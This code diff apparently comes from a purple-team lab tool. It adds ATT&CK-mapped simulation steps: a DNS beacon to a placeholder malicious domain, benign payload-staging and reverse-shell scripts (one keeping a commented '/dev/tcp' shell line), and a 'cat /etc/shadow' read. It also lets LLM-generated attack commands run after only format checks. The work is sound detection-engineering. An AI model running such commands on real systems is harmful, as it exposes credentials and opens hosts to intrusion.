@@ -15,6 +15,7 @@ from __future__ import annotations
 
 import json
 import os
+import re
 import subprocess
 import time
 from collections import defaultdict
@@ -22,6 +23,9 @@ from datetime import datetime
 from typing import Any, Dict, List, Mapping, Optional
 
 from . import ai_analyzer
+
+PAYLOAD_SIM_PATH = "/tmp/purplelab_payload_sim.sh"
+REVSHELL_SIM_PATH = "/tmp/purplelab_revshell_sim.sh"
 
 # Default ATT&CK-mapped steps used if AI scenario generation fails.
 # Each step is intentionally non-destructive and designed to generate telemetry.
@@ -31,6 +35,12 @@ DEFAULT_STEPS: List[Dict[str, str]] = [
         "technique": "T1566.001",
         "command": "curl -s http://{target}/phish.html || wget -q -O /dev/null http://{target}/phish.html",
         "description": "Simulate user clicking a malicious link in phishing email.",
+    },
+    {
+        "name": "DNS Beacon Simulation (Deterministic Rule Trigger)",
+        "technique": "T1071.004",
+        "command": "nslookup malicious.example.com || true; dig malicious.example.com +short || true",
+        "description": "Generate deterministic DNS telemetry that matches PurpleLab Suricata rule.",
     },
     {
         "name": "System Discovery",
@@ -57,18 +67,50 @@ DEFAULT_STEPS: List[Dict[str, str]] = [
         "description": "Scan for open ports.",
     },
     {
-        "name": "DNS Beacon Simulation",
-        "technique": "T1071.004",
-        "command": "nslookup test.invalid || true; dig test.invalid +short || true",
-        "description": "Simulate DNS query telemetry without contacting real external infrastructure.",
+        "name": "Payload Staging Simulation (Benign)",
+        "technique": "T1105",
+        "command": "printf '#!/usr/bin/env bash\necho purplelab benign payload simulation\n' > " + PAYLOAD_SIM_PATH + " && chmod +x " + PAYLOAD_SIM_PATH + " && " + PAYLOAD_SIM_PATH + "",
+        "description": "Create and execute a harmless local script to simulate payload staging.",
     },
     {
-        "name": "Outbound Connectivity Check (HTTP)",
-        "technique": "T1071.001",
-        "command": "curl -s -I http://{target}:80 || wget -q --spider http://{target}:80 || true",
-        "description": "Simulate benign web connectivity often used for C2 channels (no payload).",
+        "name": "Reverse Shell Attempt Simulation (Benign)",
+        "technique": "T1059.004",
+        "command": "printf '#!/usr/bin/env bash\necho purplelab reverse-shell simulation (no network action)\n# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n' > " + REVSHELL_SIM_PATH + " && chmod +x " + REVSHELL_SIM_PATH + " && " + REVSHELL_SIM_PATH + "",
+        "description": "Simulate reverse-shell execution patterns safely without opening outbound shell connectivity.",
     },
 ]
+
+# Demo mode should be deterministic and tuned for likely detection signal generation.
+DEMO_STEPS: List[Dict[str, str]] = [
+    DEFAULT_STEPS[0],  # T1566.001 phishing-like web request
+    DEFAULT_STEPS[1],  # T1071.004 deterministic DNS beacon
+    {
+        "name": "Payload Staging Simulation (Benign)",
+        "technique": "T1105",
+        "command": f"printf '#!/usr/bin/env bash\necho purplelab benign payload simulation\n' > {PAYLOAD_SIM_PATH} && chmod +x {PAYLOAD_SIM_PATH} && {PAYLOAD_SIM_PATH}",
+        "description": "Create and execute a harmless local script to simulate payload staging.",
+    },
+    {
+        "name": "Reverse Shell Attempt Simulation (Benign)",
+        "technique": "T1059.004",
+        "command": f"printf '#!/usr/bin/env bash\necho purplelab reverse-shell simulation (no network action)\n# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n' > {REVSHELL_SIM_PATH} && chmod +x {REVSHELL_SIM_PATH} && {REVSHELL_SIM_PATH}",
+        "description": "Simulate reverse-shell execution patterns safely without opening outbound shell connectivity.",
+    },
+    {
+        "name": "Credential Access - /etc/shadow Attempt",
+        "technique": "T1003.008",
+        "command": "cat /etc/shadow",
+        "description": "Attempt to read password hashes for auditd telemetry.",
+    },
+]
+
+
+def _normalize_technique(raw: Any) -> str:
+    if not raw:
+        return ""
+    text = str(raw).upper()
+    m = re.search(r"T\d{4}(?:\.\d{3})?", text)
+    return m.group(0) if m else ""
 
 
 def ping_target(ip: str, verbose: bool = False) -> bool:
@@ -134,6 +176,31 @@ def generate_scenario(config: Dict[str, Any], verbose: bool = False, demo_mode: 
         scenario = ai_analyzer.call_llm(config, prompt, json_mode=True)
         if not isinstance(scenario, dict) or "email_subject" not in scenario:
             raise ValueError("Unexpected scenario shape")
+
+        normalized_steps: List[Dict[str, str]] = []
+        for step in (scenario.get("attack_steps") or []):
+            if not isinstance(step, dict):
+                continue
+            tech = _normalize_technique(step.get("technique"))
+            cmd = (step.get("command") or "").strip()
+            if not tech or not cmd:
+                continue
+            normalized_steps.append(
+                {
+                    "name": (step.get("name") or "Step").strip(),
+                    "technique": tech,
+                    "description": (step.get("description") or step.get("name") or "").strip(),
+                    "command": cmd,
+                }
+            )
+
+        if demo_mode:
+            scenario["attack_steps"] = DEMO_STEPS
+        elif len(normalized_steps) >= 3:
+            scenario["attack_steps"] = normalized_steps
+        else:
+            scenario["attack_steps"] = DEFAULT_STEPS
+
         if verbose:
             print("[VERBOSE] AI scenario generated successfully.")
     except Exception as e:
@@ -146,7 +213,7 @@ def generate_scenario(config: Dict[str, Any], verbose: bool = False, demo_mode: 
                 "[Link]\n\n"
                 "IT Department"
             ),
-            "attack_steps": DEFAULT_STEPS,
+            "attack_steps": DEMO_STEPS if demo_mode else DEFAULT_STEPS,
         }
 
     with open(f"{run_dir}/scenario/email_template.txt", "w", encoding="utf-8") as f:
